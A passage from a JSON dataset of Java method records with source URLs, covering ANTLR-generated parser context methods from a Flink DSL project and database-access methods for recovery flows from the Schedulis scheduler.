"static"]}}, {"id": 56125, "method_name": "exitRule", "class_name": "SaveContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitSave(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56126, "method_name": "accept", "class_name": "SaveContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitSave(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56127, "method_name": "kafkaSave", "class_name": "SaveInfoContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "KafkaSaveContext", "snippet": "\t\tpublic KafkaSaveContext kafkaSave() {\n\t\t\treturn getRuleContext(KafkaSaveContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56128, "method_name": "mysqlSave", "class_name": "SaveInfoContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MysqlSaveContext", "snippet": "\t\tpublic MysqlSaveContext mysqlSave() {\n\t\t\treturn getRuleContext(MysqlSaveContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56129, "method_name": "getRuleIndex", "class_name": "SaveInfoContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_saveInfo; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56130, "method_name": "enterRule", "class_name": "SaveInfoContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterSaveInfo(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56131, "method_name": "exitRule", "class_name": "SaveInfoContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitSaveInfo(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56132, "method_name": "accept", "class_name": "SaveInfoContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitSaveInfo(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56133, "method_name": "STRING", "class_name": "KafkaSaveContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TerminalNode>", "snippet": "\t\tpublic List<TerminalNode> STRING() { return getTokens(MingBdJSONParser.STRING); }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56134, "method_name": "STRING", "class_name": "KafkaSaveContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "TerminalNode", "snippet": "\t\tpublic TerminalNode STRING(int i) {\n\t\t\treturn getToken(MingBdJSONParser.STRING, i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56135, "method_name": "cols", "class_name": "KafkaSaveContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ColsContext", "snippet": "\t\tpublic ColsContext cols() {\n\t\t\treturn getRuleContext(ColsContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56136, "method_name": "getRuleIndex", "class_name": "KafkaSaveContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_kafkaSave; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56137, "method_name": "enterRule", "class_name": "KafkaSaveContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterKafkaSave(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56138, "method_name": "exitRule", "class_name": "KafkaSaveContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitKafkaSave(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56139, "method_name": "accept", "class_name": "KafkaSaveContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitKafkaSave(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56140, "method_name": "getRuleIndex", "class_name": "MysqlSaveContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_mysqlSave; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56141, "method_name": "enterRule", "class_name": "MysqlSaveContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterMysqlSave(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56142, "method_name": "exitRule", "class_name": "MysqlSaveContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitMysqlSave(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56143, "method_name": "accept", "class_name": "MysqlSaveContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitMysqlSave(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56144, "method_name": "STRING", "class_name": "JoinpairContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TerminalNode>", "snippet": "\t\tpublic List<TerminalNode> STRING() { return getTokens(MingBdJSONParser.STRING); }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56145, "method_name": "STRING", "class_name": "JoinpairContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "TerminalNode", "snippet": "\t\tpublic TerminalNode STRING(int i) {\n\t\t\treturn getToken(MingBdJSONParser.STRING, i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56146, "method_name": "getRuleIndex", "class_name": "JoinpairContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_joinpair; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56147, "method_name": "enterRule", "class_name": "JoinpairContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterJoinpair(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56148, "method_name": "exitRule", "class_name": "JoinpairContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitJoinpair(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56149, "method_name": "accept", "class_name": "JoinpairContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitJoinpair(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56150, "method_name": "STRING", "class_name": "KafkaSourceContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TerminalNode>", "snippet": "\t\tpublic List<TerminalNode> STRING() { return getTokens(MingBdJSONParser.STRING); }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56151, "method_name": "STRING", "class_name": "KafkaSourceContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "TerminalNode", "snippet": "\t\tpublic TerminalNode STRING(int i) {\n\t\t\treturn getToken(MingBdJSONParser.STRING, i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56152, "method_name": "field", "class_name": "KafkaSourceContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<FieldContext>", "snippet": "\t\tpublic List<FieldContext> field() {\n\t\t\treturn getRuleContexts(FieldContext.class);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56153, "method_name": "field", "class_name": "KafkaSourceContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "FieldContext", "snippet": "\t\tpublic FieldContext field(int i) {\n\t\t\treturn getRuleContext(FieldContext.class,i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56154, "method_name": "getRuleIndex", "class_name": "KafkaSourceContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_kafkaSource; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56155, "method_name": "enterRule", "class_name": "KafkaSourceContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterKafkaSource(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56156, "method_name": "exitRule", "class_name": "KafkaSourceContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitKafkaSource(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56157, "method_name": "accept", "class_name": "KafkaSourceContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitKafkaSource(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56158, "method_name": "STRING", "class_name": "FieldContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TerminalNode>", "snippet": "\t\tpublic List<TerminalNode> STRING() { return getTokens(MingBdJSONParser.STRING); }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56159, "method_name": "STRING", "class_name": "FieldContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "TerminalNode", "snippet": "\t\tpublic TerminalNode STRING(int i) {\n\t\t\treturn getToken(MingBdJSONParser.STRING, i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56160, "method_name": "getRuleIndex", "class_name": "FieldContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_field; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56161, "method_name": "enterRule", "class_name": "FieldContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterField(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56162, "method_name": "exitRule", "class_name": "FieldContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitField(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56163, "method_name": "accept", "class_name": "FieldContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitField(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56164, "method_name": "uploadExecutableRecoverFlow", "class_name": "ExecutionRecoverDao", "params": ["ExecutionRecover"], "throws": ["ExecutorManagerException"], "modifiers": ["synchronized", "public"], "return_type": "Integer", "snippet": "  public synchronized Integer uploadExecutableRecoverFlow(final ExecutionRecover recover)\n      throws ExecutorManagerException {\n    final String INSERT_EXECUTABLE_RECOVER_FLOW = \"INSERT INTO execution_recover_flows \"\n        + \"(recover_status, recover_start_time, recover_end_time, ex_interval, \"\n        + \"now_exec_id, project_id, flow_id, \"\n        + \"submit_user, submit_time, update_time ) \"\n        + \"values (?,?,?,?,?,?,?,?,?,?)\";\n    final long submitTime = System.currentTimeMillis();\n\n    final SQLTransaction<Long> insertAndGetLastID = transOperator -> {\n      transOperator.update(INSERT_EXECUTABLE_RECOVER_FLOW,\n\n          recover.getRecoverStatus().getNumVal(),\n          recover.getRecoverStartTime(),\n          recover.getRecoverEndTime(),\n          recover.getExInterval(),\n\n          recover.getNowExecutionId(),\n          recover.getProjectId(),\n          recover.getFlowId(),\n\n          recover.getSubmitUser(),\n          submitTime,\n          submitTime);\n      transOperator.getConnection().commit();\n      return transOperator.getLastInsertId();\n    };\n    try {\n      final long id = this.dbOperator.transaction(insertAndGetLastID);\n      logger.info(\"History Recover given \" + recover.getRecoverId() + \" given id \" + id);\n      recover.setRecoverId((int)id);\n      updateExecutableRecoverFlow(recover);\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error creating History Recover.\", e);\n    }\n    return recover.getRecoverId();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56165, "method_name": "updateExecutableRecoverFlow", "class_name": "ExecutionRecoverDao", "params": ["ExecutionRecover"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateExecutableRecoverFlow(final ExecutionRecover recover) throws ExecutorManagerException {\n    updateExecutableRecoverFlow(recover, EncodingType.GZIP);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56166, "method_name": "updateExecutableRecoverFlow", "class_name": "ExecutionRecoverDao", "params": ["ExecutionRecover", "EncodingType"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void updateExecutableRecoverFlow(final ExecutionRecover recover, final EncodingType encType)\n      throws ExecutorManagerException {\n    final String UPDATE_EXECUTABLE_RECOVER_FLOW_DATA =\n        \"UPDATE execution_recover_flows \"\n            + \"SET recover_status=?, now_exec_id=?, update_time=?, start_time=?, end_time=?, enc_type=?, recover_data=? \"\n            + \"WHERE recover_id=? \";\n\n    final String json = JSONUtils.toJSON(recover.toObject());\n    byte[] data = null;\n    try {\n      final byte[] stringData = json.getBytes(\"UTF-8\");\n      data = stringData;\n      // Todo kunkun-tang: use a common method to transform stringData to data.\n      if (encType == EncodingType.GZIP) {\n        data = GZIPUtils.gzipBytes(stringData);\n      }\n    } catch (final IOException e) {\n      throw new ExecutorManagerException(\"Error encoding the execution recover flow.\");\n    }\n\n    try {\n      this.dbOperator.update(UPDATE_EXECUTABLE_RECOVER_FLOW_DATA,\n          recover.getRecoverStatus().getNumVal(),\n          recover.getNowExecutionId(),\n          recover.getUpdateTime(),\n          recover.getStartTime(),\n          recover.getEndTime(),\n          encType.getNumVal(),\n          data,\n          recover.getRecoverId());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error updating History Recover.\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56167, "method_name": "getHistoryRecoverFlows", "class_name": "ExecutionRecoverDao", "params": ["Integer"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutionRecover", "snippet": "  public ExecutionRecover getHistoryRecoverFlows(final Integer recoverId)\n      throws ExecutorManagerException {\n\n    String query =\n        \"SELECT recover_id, recover_status, enc_type, recover_data FROM execution_recover_flows where recover_id = ?\";\n\n    final List<Object> params = new ArrayList<>();\n\n    params.add(recoverId);\n\n    try {\n      List<ExecutionRecover> recoverList = this.dbOperator.query(query, new FetchExecutionRecoverFlows(), params.toArray());\n      if(recoverList.size() > 0){\n        return recoverList.get(0);\n      }else {\n        return null;\n      }\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching history recover flows\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56168, "method_name": "listHistoryRecoverFlowByFlowId", "class_name": "ExecutionRecoverDao", "params": ["String", "String"], "throws": ["ExecutorManagerException"], "modifiers": [], "return_type": "List<ExecutionRecover>", "snippet": "  List<ExecutionRecover> listHistoryRecoverFlowByFlowId(final String flowId, final String projectId)\n      throws ExecutorManagerException {\n\n    String query =\n        \"select exec_id, enc_type, flow_data \"\n            + \"from execution_flows \"\n            + \"where flow_id = ? and project_id = ? and repeat_id != '' \"\n            + \"order by start_time DESC limit 1 \";\n\n    final List<Object> params = new ArrayList<>();\n\n    params.add(flowId);\n\n    params.add(projectId);\n\n    try {\n      return this.dbOperator.query(query, new FetchExecutionRecoverFlows(), params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching history recover flow by flowId\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56169, "method_name": "listHistoryRecoverFlows", "class_name": "ExecutionRecoverDao", "params": ["Map", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionRecover>", "snippet": "  public List<ExecutionRecover> listHistoryRecoverFlows(final Map paramMap, final int skip, final int num)\n      throws ExecutorManagerException {\n\n    StringBuilder querySql = new StringBuilder(\"SELECT recover_id, recover_status, erf.enc_type, recover_data FROM execution_recover_flows erf \"\n            + \"join projects p on erf.project_id = p.id \"\n            + \"WHERE recover_status=30 \");\n\n    final List<Object> params = new ArrayList<>();\n\n    boolean first = false;\n\n    if(!paramMap.isEmpty()){\n\n      String projContain = MapUtils.getString(paramMap, \"projContain\");\n      if (projContain != null && !projContain.isEmpty()) {\n        wrapperSqlParam(first, paramMap, \"projContain\", null, \"name\", \"like\", querySql, params);\n      }\n\n      //String flowContains = String.valueOf(paramMap.get(\"flowContains\"));\n      String flowContains = MapUtils.getString(paramMap, \"flowContains\");\n\n      // todo kunkun-tang: we don't need the below complicated logics. We should just use a simple way.\n      if (flowContains != null && !flowContains.isEmpty()) {\n        wrapperSqlParam(first, paramMap, \"flowContains\", null, \"flow_id\", \"like\", querySql, params);\n      }\n\n      Integer recoverStatus = MapUtils.getInteger(paramMap, \"recoverStatus\");\n\n      if (recoverStatus != null && recoverStatus != 0) {\n        wrapperSqlParam(first, paramMap, \"recoverStatus\", \"int\", \"recover_status\", \"=\", querySql, params);\n      }\n\n      String userName = MapUtils.getString(paramMap, \"userName\");\n\n      if(userName != null && !userName.isEmpty()){\n        wrapperSqlParam(first, paramMap, \"userName\", null, \"submit_user\", \"=\", querySql, params);\n      }\n\n    }\n\n    if (skip > -1 && num > 0) {\n      querySql.append(\"  ORDER BY recover_id DESC LIMIT ?, ?\");\n      params.add(skip);\n      params.add(num);\n    }\n\n    try {\n      return this.dbOperator.query(querySql.toString(), new FetchExecutionRecoverFlows(), params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching history recover flows\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56170, "method_name": "listMaintainedHistoryRecoverFlows", "class_name": "ExecutionRecoverDao", "params": ["String", "List<Integer>", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionRecover>", "snippet": "  public List<ExecutionRecover> listMaintainedHistoryRecoverFlows(String username, List<Integer> maintainedProjectIds, int skip, int num)\n          throws ExecutorManagerException {\n    String projectIds = maintainedProjectIds.stream()\n            .map(Objects::toString)\n            .collect(joining(\",\", \"(\", \")\"));\n    String querySQL = \"SELECT recover_id, recover_status, erf.enc_type, recover_data, erf.project_id AS project_id FROM execution_recover_flows erf \"\n            + \"JOIN projects p ON erf.project_id = p.id WHERE recover_status=30\"\n            + \" AND (project_id IN \" + projectIds + \" OR submit_user = ?)\"\n            + \" ORDER BY recover_id DESC LIMIT ?, ?\";\n    try {\n      return this.dbOperator.query(querySQL, new FetchExecutionRecoverFlows(), username, skip, num);\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching history recover flows\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, 